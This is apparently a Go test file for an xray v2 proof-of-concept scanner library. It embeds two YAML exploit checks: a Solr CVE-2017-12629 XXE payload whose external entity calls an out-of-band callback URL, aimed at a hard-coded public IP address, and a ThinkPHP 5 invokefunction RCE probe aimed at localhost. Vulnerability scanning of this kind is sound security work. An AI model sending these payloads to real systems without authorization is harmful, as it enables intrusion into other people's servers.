package xray_v2_pocs_yml

import "testing"

func TestXray2(t *testing.T) {
	//初始化框架,单例模式，所有url公用同一个http请求池（需测试bug，是否有线程竞争）
	xx := InitXrayV2Poc("", "", "")
	//批量加载poc，适用于大量地址调用poc，不会重复加载，提高效率
	pocs := xx.LoadMultiPocs([][]byte{[]byte("name: poc-yaml-solr-cve-2017-12629-xxe\nmanual: true\ntransport: http\nset:\n    reverse: newReverse()\n    reverseURL: reverse.url\nrules:\n    r0:\n        request:\n            cache: true\n            method: GET\n            path: /solr/admin/cores?wt=json\n        expression: \"true\"\n        output:\n            search: '\"\\\"name\\\":\\\"(?P<core>[^\\\"]+)\\\",\".bsubmatch(response.body)'\n            core: search[\"core\"]\n    r1:\n        request:\n            cache: true\n            method: GET\n            path: /solr/{{core}}/select?q=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%0A%3C!DOCTYPE%20root%20%5B%0A%3C!ENTITY%20%25%20remote%20SYSTEM%20%22{{reverseURL}}%22%3E%0A%25remote%3B%5D%3E%0A%3Croot%2F%3E&wt=xml&defType=xmlparser\n            follow_redirects: true\n        expression: reverse.wait(5)\nexpression: r0() && r1()\ndetail:\n    author: sharecast\n    links:\n        - https://github.com/vulhub/vulhub/tree/master/solr/CVE-2017-12629-XXE\n")})
	//单个地址执行多个poc，执行结果返回为[]string
	aa := xx.XrayCheckByQuery("http://123.58.224.8:31053", pocs, []Content{})

	println(aa)
}

func TestInitXrayV2Poc(t *testing.T) {
	xx := InitXrayV2Poc("", "", "")
	aa := xx.RunXrayCheckOneByQuery("http://127.0.0.1:8080", []byte("name: poc-yaml-thinkphp5-controller-rce\nmanual: true\ntransport: http\nrules:\n    r0:\n        request:\n            cache: true\n            method: GET\n            path: /index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=a29hbHIgaXMg%25%25d2F0Y2hpbmcgeW91\n        expression: response.body.bcontains(b\"a29hbHIgaXMg%d2F0Y2hpbmcgeW9129\")\nexpression: r0()\ndetail:\n    links:\n        - https://github.com/vulhub/vulhub/tree/master/thinkphp/5-rce"), []Content{})
	println(aa)
}
